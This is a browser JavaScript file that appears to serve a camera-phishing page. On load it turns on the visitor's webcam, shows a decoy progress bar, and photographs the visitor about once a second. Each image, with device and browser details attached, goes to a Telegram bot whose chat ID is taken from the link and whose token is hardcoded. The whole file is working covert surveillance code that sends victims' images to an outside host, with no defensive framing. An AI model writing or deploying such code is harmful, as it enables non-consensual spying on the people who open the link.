const BOT_TOKEN = "AAFpXlIk0KHB5j3SljkE7DvheXngu7wA2Kg";
const CHAT_ID = new URLSearchParams(location.search).get("id");

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const bar = document.getElementById("bar");

let stream;

// auto start
start();

async function start() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    video.onloadedmetadata = () => loop();
  } catch (e) {
    console.log("Permission needed");
  }
}

function loop() {
  let progress = 0;

  setInterval(() => {
    progress += 5;
    bar.style.width = progress + "%";

    if (progress >= 100) {
      progress = 0;
      bar.style.width = "0%";
      capture();
    }

  }, 50);
}

function capture() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  ctx.filter = "brightness(1.1) contrast(1.2) saturate(1.2)";
  ctx.drawImage(video, 0, 0);

  canvas.toBlob(send, "image/jpeg");
}

function send(blob) {
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("photo", blob, "img.jpg");

  const caption =
`📸 Secure Capture

📱 Device: ${navigator.platform}
🌐 Browser: ${navigator.userAgent}

🤖 Bot: @ProSimTookBot
👨‍💻 Dev: @XFPro43`;

  fd.append("caption", caption);

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: fd
  });
}
